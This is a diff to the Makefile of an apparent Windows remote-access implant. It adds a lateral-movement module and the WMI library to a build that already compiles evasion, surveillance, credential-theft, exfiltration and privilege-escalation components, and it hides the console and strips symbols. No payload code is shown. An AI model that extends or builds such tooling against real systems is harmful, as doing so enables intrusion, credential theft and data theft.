@@ -12,7 +12,7 @@ CFLAGS += -I./include -I./src
 # Flags pour cacher la console et strip les symbols
 LDFLAGS = -s -mwindows
 LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid -lgdiplus -lcrypt32 -ldbghelp -lshlwapi
-LDFLAGS += -lbcrypt -ltaskschd -loleaut32 -lntdll -lpsapi
+LDFLAGS += -lbcrypt -ltaskschd -loleaut32 -lntdll -lpsapi -lwbemuuid
 
 # Flags de debug (décommenter pour debug)
 # CFLAGS += -g -DDEBUG
@@ -77,7 +77,9 @@ RECON_SRC = $(SRC_DIR)/recon/scanner.c
 
 PRIVESC_SRC = $(SRC_DIR)/privesc/privesc.c
 
-ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC) $(CREDENTIALS_SRC) $(EXFIL_SRC) $(RECON_SRC) $(PRIVESC_SRC)
+LATERAL_SRC = $(SRC_DIR)/lateral/lateral.c
+
+ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC) $(CREDENTIALS_SRC) $(EXFIL_SRC) $(RECON_SRC) $(PRIVESC_SRC) $(LATERAL_SRC)
 
 # Fichiers objets
 OBJ = $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(ALL_SRC))
@@ -114,6 +116,7 @@ dirs:
 	@mkdir -p $(BUILD_DIR)/exfil
 	@mkdir -p $(BUILD_DIR)/recon
 	@mkdir -p $(BUILD_DIR)/privesc
+	@mkdir -p $(BUILD_DIR)/lateral
 	@mkdir -p $(BIN_DIR)
 
 $(EXE_TARGET): $(OBJ)
